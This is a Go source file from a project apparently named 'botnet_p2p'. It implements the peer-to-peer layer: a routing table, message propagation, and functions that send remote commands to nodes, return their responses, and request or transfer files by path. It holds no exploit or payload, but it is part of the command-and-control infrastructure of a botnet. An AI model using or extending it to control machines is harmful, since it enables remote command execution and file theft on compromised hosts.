package p2p_layer

import (
	"github.com/lampo100/botnet_p2p/models"
	"log"
	"github.com/lampo100/botnet_p2p/message_layer"
	"sync"
)

var routingTable models.BucketList
var BLMessageChannel chan models.Message
var myNode models.Node

var terminateChannel chan struct{}
var hasTerminated chan struct{}
var nextLayerTerminated chan struct{}

var P2PMessageChannel chan models.Message

var mutex = &sync.Mutex{}

var propagationMessages []models.UUID

func InitLayer(selfNode models.Node, messageChannel chan models.Message, terminate chan struct{}, thisTerminated chan struct{}) {
	BLMessageChannel = messageChannel
	myNode = selfNode
	terminateChannel = terminate
	hasTerminated = thisTerminated
	nextLayerTerminated = make(chan struct{})
	P2PMessageChannel = make(chan models.Message)
	routingTable.Init(myNode)
	message_layer.InitLayer(myNode, P2PMessageChannel, terminateChannel, nextLayerTerminated)
	go messageRoutine()
	log.Println("[P2] Initialized")
}

func messageRoutine() {
	for {
		select {
		case message := <-P2PMessageChannel:
			uuid := models.GuidFromString(message.Uuid)
			newMessage := true
			for _, x := range propagationMessages {
				if x == uuid {
					newMessage = false
					break
				}
			}
			if message.Propagate == true && newMessage {
				propagationMessages = append(propagationMessages, uuid)
				for _, node := range routingTable.GetAllNodes() {
					message_layer.SendMarshaledMessage(node, message)
				}
			}
			BLMessageChannel <- message
		case <-terminateChannel:
			<-nextLayerTerminated
			log.Println("[P2] Terminated")
			hasTerminated <- struct{}{}
			return
		}
	}
}

func Ping(targetNode models.Node) error {
	return message_layer.Ping(targetNode)
}

func PingResponse(targetNode models.Node) error {
	return message_layer.PingResponse(targetNode)
}

func FindNode(targetNode models.Node, guid models.UUID) error {
	return message_layer.FindNode(targetNode, guid)
}

func FoundNodes(targetNode models.Node, guid models.UUID) error {
	mutex.Lock()
	nodes := routingTable.NearestNodes(guid, 100)
	mutex.Unlock()
	return message_layer.FoundNodes(targetNode, nodes)
}

func LeaveNetwork() error {
	var err error
	nodes := routingTable.GetAllNodes()
	for _, node := range nodes {
		err = message_layer.LeaveNetwork(node)
	}
	return err
}

func Command(target models.Node, command string, shouldRespond bool) error {
	return message_layer.Command(target, command, shouldRespond)
}

func CommandResponse(targetNode models.Node, command, response string) error {
	return message_layer.CommandResponse(targetNode, command, response)
}

func FileChunk(target models.Node, uuid models.UUID, name string, size, number uint32, data []byte) error {
	return message_layer.FileChunk(target, uuid, name, size, number, data)
}

func RequestFile(target models.Node, path string) error {
	return message_layer.RequestFile(target, path)
}

func AddNodeToRoutingTable(node models.Node) {
	log.Printf("[P2] Adding node to RT: %v\n", node)
	mutex.Lock()
	routingTable.Insert(node)
	mutex.Unlock()
	log.Printf("[P2] RoutingTable:\n%v", routingTable.String())
}

func RemoveFromRoutingTable(node models.Node) {
	log.Printf("[P2] Removing node to RT: %v\n", node)
	mutex.Lock()
	routingTable.Remove(node)
	mutex.Unlock()
	log.Printf("[P2] RoutingTable:\n%v", routingTable.String())
}

func GetAllNodes() []models.Node {
	return routingTable.GetAllNodes()
}